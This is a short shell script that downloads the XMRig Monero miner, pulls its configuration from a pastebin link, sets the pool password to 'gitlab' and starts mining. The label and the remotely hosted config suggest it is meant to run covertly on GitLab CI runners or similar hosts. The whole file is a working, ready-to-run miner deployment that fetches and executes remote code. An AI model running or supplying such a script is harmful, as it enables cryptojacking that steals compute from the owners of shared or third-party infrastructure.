#!/bin/sh
curl -L -o xmrig.tar.gz https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
tar xvfz xmrig.tar.gz
curl -L -o config.json https://pastebin.com/raw/8F0nq1TL
# PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
PASS="gitlab"
LOCATION=`pwd`
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $LOCATION/config.json
./xmrig --config=config.json
